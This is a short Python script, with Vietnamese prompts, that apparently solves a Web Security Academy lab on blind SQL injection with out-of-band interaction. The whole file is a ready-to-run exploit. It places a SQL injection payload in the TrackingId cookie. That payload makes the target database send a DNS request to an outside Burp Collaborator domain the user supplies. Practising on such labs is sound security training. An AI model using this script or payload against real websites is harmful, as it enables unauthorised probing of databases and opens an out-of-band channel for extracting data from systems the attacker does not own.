import requests

def inject_oob(url, collab_domain, session_cookie):
    print("[*] Gửi payload OOB SQLi tới server...")

    payload = f"xyz'||(SELECT+make_dns_request('{collab_domain}'))--"
    cookies = {
        "TrackingId": payload,
        "session": session_cookie
    }

    try:
        response = requests.get(url, cookies=cookies)
        if response.status_code == 200:
            print("[+] Payload gửi thành công! Kiểm tra Collaborator để xác nhận.")
        else:
            print(f"[-] Yêu cầu HTTP trả về mã lỗi: {response.status_code}")
    except Exception as e:
        print(f"[!] Gặp lỗi khi gửi request: {e}")

if __name__ == "__main__":
    print("=== Blind SQLi w/ Out-of-Band (OOB) Interaction ===")
    url = input("Nhập URL (ví dụ: https://xxxxx.web-security-academy.net): ").rstrip("/")
    collab_domain = input("Nhập Burp Collaborator domain (vd: abc123xyz.oastify.com): ").strip()
    session_cookie = input("Nhập giá trị session cookie: ").strip()

    inject_oob(url, collab_domain, session_cookie)
